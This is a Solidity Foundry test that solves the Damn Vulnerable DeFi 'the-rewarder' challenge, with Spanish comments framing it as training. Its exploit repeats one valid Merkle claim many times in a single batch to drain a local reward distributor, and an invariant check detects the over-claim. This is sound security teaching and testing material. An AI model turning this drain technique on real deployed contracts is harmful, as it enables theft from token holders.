// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Merkle} from "murky/Merkle.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {TheRewarderDistributor, IERC20, Distribution, Claim} from "../../src/the-rewarder/TheRewarderDistributor.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

/*
 * NEXUS Offensive · training/dvd · reto "the-rewarder"
 *
 * CLASE DE BUG: reclamo múltiple en una sola tx (contabilidad de claims rota).
 *   `claimRewards` procesa un lote y solo marca "reclamado" una vez por grupo
 *   de token, pero TRANSFIERE en cada entrada del lote. Repitiendo el mismo
 *   claim válido N veces en un solo lote, el beneficiario cobra N veces su
 *   asignación y drena la distribución.
 *
 * FAMILIA: Staking / rewards.
 *
 * INVARIANTE QUE LO ATRAPA (REUSA Capa 2 — Staking S1):
 *   "las recompensas repartidas nunca exceden las emitidas"; por beneficiario:
 *   lo reclamado <= su asignación (hoja Merkle). Se sostiene al inicio
 *   (0 <= asignación) y se rompe tras el exploit (N × asignación). => CUBIERTO.
 */
contract TheRewarderChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address alice = makeAddr("alice");
    address recovery = makeAddr("recovery");

    uint256 constant BENEFICIARIES_AMOUNT = 1000;
    uint256 constant TOTAL_DVT_DISTRIBUTION_AMOUNT = 10 ether;
    uint256 constant TOTAL_WETH_DISTRIBUTION_AMOUNT = 1 ether;

    uint256 constant ALICE_DVT_CLAIM_AMOUNT = 2502024387994809;
    uint256 constant ALICE_WETH_CLAIM_AMOUNT = 228382988128225;

    TheRewarderDistributor distributor;
    Merkle merkle;

    DamnValuableToken dvt;
    bytes32 dvtRoot;
    WETH weth;
    bytes32 wethRoot;

    // Instrumentación: hojas y datos del claim del player.
    bytes32[] dvtLeaves;
    bytes32[] wethLeaves;
    uint256 playerDvtIndex;
    uint256 playerDvtAmount;
    uint256 playerWethIndex;
    uint256 playerWethAmount;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    // SETS UP CHALLENGE (núcleo DVD, verbatim) + extracción del claim del player
    function setUp() public {
        startHoax(deployer);
        dvt = new DamnValuableToken();
        weth = new WETH();
        weth.deposit{value: TOTAL_WETH_DISTRIBUTION_AMOUNT}();

        dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json", true);
        wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json", false);
        merkle = new Merkle();
        dvtRoot = merkle.getRoot(dvtLeaves);
        wethRoot = merkle.getRoot(wethLeaves);

        distributor = new TheRewarderDistributor();
        dvt.approve(address(distributor), TOTAL_DVT_DISTRIBUTION_AMOUNT);
        distributor.createDistribution({token: IERC20(address(dvt)), newRoot: dvtRoot, amount: TOTAL_DVT_DISTRIBUTION_AMOUNT});
        weth.approve(address(distributor), TOTAL_WETH_DISTRIBUTION_AMOUNT);
        distributor.createDistribution({token: IERC20(address(weth)), newRoot: wethRoot, amount: TOTAL_WETH_DISTRIBUTION_AMOUNT});

        // Alice (índice 2) reclama una vez.
        IERC20[] memory tokensToClaim = new IERC20[](2);
        tokensToClaim[0] = IERC20(address(dvt));
        tokensToClaim[1] = IERC20(address(weth));
        Claim[] memory claims = new Claim[](2);
        claims[0] = Claim({batchNumber: 0, amount: ALICE_DVT_CLAIM_AMOUNT, tokenIndex: 0, proof: merkle.getProof(dvtLeaves, 2)});
        claims[1] = Claim({batchNumber: 0, amount: ALICE_WETH_CLAIM_AMOUNT, tokenIndex: 1, proof: merkle.getProof(wethLeaves, 2)});
        vm.startPrank(alice);
        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
        vm.expectRevert(TheRewarderDistributor.AlreadyClaimed.selector);
        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
        vm.stopPrank();
        vm.stopPrank();
    }

    /// @notice INVARIANTE (S1): lo reclamado por un beneficiario <= su asignación.
    function _invariant_noOverClaim(uint256 claimed, uint256 entitlement) internal pure returns (bool) {
        return claimed <= entitlement;
    }

    function test_theRewarder() public checkSolvedByPlayer {
        // La invariante se sostiene al inicio (el player no ha reclamado nada).
        assertTrue(_invariant_noOverClaim(0, playerDvtAmount), "INV debe sostenerse al inicio");

        IERC20[] memory tokens = new IERC20[](2);
        tokens[0] = IERC20(address(dvt));
        tokens[1] = IERC20(address(weth));

        bytes32[] memory dvtProof = merkle.getProof(dvtLeaves, playerDvtIndex);
        bytes32[] memory wethProof = merkle.getProof(wethLeaves, playerWethIndex);

        // Repetir el claim válido tantas veces como quepa en lo que resta.
        uint256 nDvt = distributor.getRemaining(address(dvt)) / playerDvtAmount;
        uint256 nWeth = distributor.getRemaining(address(weth)) / playerWethAmount;

        Claim[] memory claims = new Claim[](nDvt + nWeth);
        for (uint256 i = 0; i < nDvt; i++) {
            claims[i] = Claim({batchNumber: 0, amount: playerDvtAmount, tokenIndex: 0, proof: dvtProof});
        }
        for (uint256 i = 0; i < nWeth; i++) {
            claims[nDvt + i] = Claim({batchNumber: 0, amount: playerWethAmount, tokenIndex: 1, proof: wethProof});
        }

        distributor.claimRewards({inputClaims: claims, inputTokens: tokens});

        uint256 claimedDvt = dvt.balanceOf(player);
        console.log("asignacion del player (DVT):", playerDvtAmount);
        console.log("reclamado por el player (DVT):", claimedDvt);

        // Lo reclamado excede por mucho la asignación → invariante S1 rota.
        assertFalse(_invariant_noOverClaim(claimedDvt, playerDvtAmount), "INV rota: reclamado > asignacion");

        // Enviar el botín a la cuenta de rescate.
        dvt.transfer(recovery, dvt.balanceOf(player));
        weth.transfer(recovery, weth.balanceOf(player));
    }

    // CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
    function _isSolved() private view {
        assertLt(dvt.balanceOf(address(distributor)), 1e16, "Too much DVT in distributor");
        assertLt(weth.balanceOf(address(distributor)), 1e15, "Too much WETH in distributor");
        assertEq(
            dvt.balanceOf(recovery),
            TOTAL_DVT_DISTRIBUTION_AMOUNT - ALICE_DVT_CLAIM_AMOUNT - dvt.balanceOf(address(distributor)),
            "Not enough DVT in recovery account"
        );
        assertEq(
            weth.balanceOf(recovery),
            TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT - weth.balanceOf(address(distributor)),
            "Not enough WETH in recovery account"
        );
    }

    struct Reward {
        address beneficiary;
        uint256 amount;
    }

    /// @dev Carga el JSON, arma las hojas y guarda el índice/monto del player.
    function _loadRewards(string memory path, bool isDvt) private returns (bytes32[] memory leaves) {
        Reward[] memory rewards =
            abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path))), (Reward[]));
        assertEq(rewards.length, BENEFICIARIES_AMOUNT);
        leaves = new bytes32[](BENEFICIARIES_AMOUNT);
        for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
            leaves[i] = keccak256(abi.encodePacked(rewards[i].beneficiary, rewards[i].amount));
            if (rewards[i].beneficiary == player) {
                if (isDvt) {
                    playerDvtIndex = i;
                    playerDvtAmount = rewards[i].amount;
                } else {
                    playerWethIndex = i;
                    playerWethAmount = rewards[i].amount;
                }
            }
        }
    }
}
